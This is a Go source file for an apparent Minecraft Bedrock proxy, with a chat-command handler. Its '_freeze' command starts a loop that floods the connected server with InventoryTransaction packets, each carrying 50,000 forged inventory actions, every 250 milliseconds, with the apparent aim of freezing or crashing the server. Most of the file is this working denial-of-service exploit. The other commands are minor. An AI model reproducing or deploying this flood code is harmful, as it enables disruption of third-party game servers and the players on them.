package session

import (
	"fmt"
	"github.com/df-mc/dragonfly/server/event"
	"github.com/sandertv/gophertunnel/minecraft"
	"github.com/sandertv/gophertunnel/minecraft/protocol"
	"github.com/sandertv/gophertunnel/minecraft/protocol/packet"
	"time"
)

var (
	freezing bool
)

func freeze(serverConn *minecraft.Conn) {
	COUNT := 50000
	for freezing {
		if serverConn == nil {
			return
		}
		actions := make([]protocol.InventoryAction, COUNT)
		for i := range actions {
			newAction := actions[i]
			newAction.InventorySlot = 28
			newAction.SourceType = protocol.InventoryActionSourceContainer
			newAction.WindowID = protocol.WindowIDInventory
			newAction.NewItem = protocol.ItemInstance{
				StackNetworkID: 0,
				Stack: protocol.ItemStack{
					ItemType: protocol.ItemType{
						NetworkID: 0,
					},
					BlockRuntimeID: 0,
					Count:          32,
					HasNetworkID:   true,
				},
			}
			newAction.OldItem = protocol.ItemInstance{
				StackNetworkID: 2,
				Stack: protocol.ItemStack{
					ItemType: protocol.ItemType{
						NetworkID: 2,
					},
					BlockRuntimeID: 2,
					Count:          2,
					HasNetworkID:   true,
				},
			}

			actions[i] = newAction
		}
		err := serverConn.WritePacket(&packet.InventoryTransaction{
			Actions:         actions,
			TransactionData: &protocol.NormalTransactionData{},
		})
		if err != nil {
			break
		}
		fmt.Printf("Sending %d modified payloads to the server!\n", COUNT)
		time.Sleep(250 * time.Millisecond)
	}
	freezing = false
}

// TextHandler is a handler that handles text packets.
type TextHandler struct{}

func (h *TextHandler) Handle(ctx *event.Context, p packet.Packet, s *Session) error {
	pk := p.(*packet.Text)
	if pk.TextType == packet.TextTypeChat {
		switch pk.Message {
		case "_freeze":
			freezing = true
			go freeze(s.remoteConn)
			ctx.Cancel()
		case "_unfreeze":
			freezing = false
		case "_transfer":
			_ = s.conn.WritePacket(&packet.Transfer{
				Address: "localhost",
				Port:    19132,
			})
		case "_hey":
			_ = s.remoteConn.WritePacket(&packet.Text{
				TextType: packet.TextTypeChat,
				Message:  "Totogros est moins beau que Restart",
			})
			ctx.Cancel()
		default:
			fmt.Printf("%s: %s\n", s.c.Name(), pk.Message)
		}
	}
	return nil
}
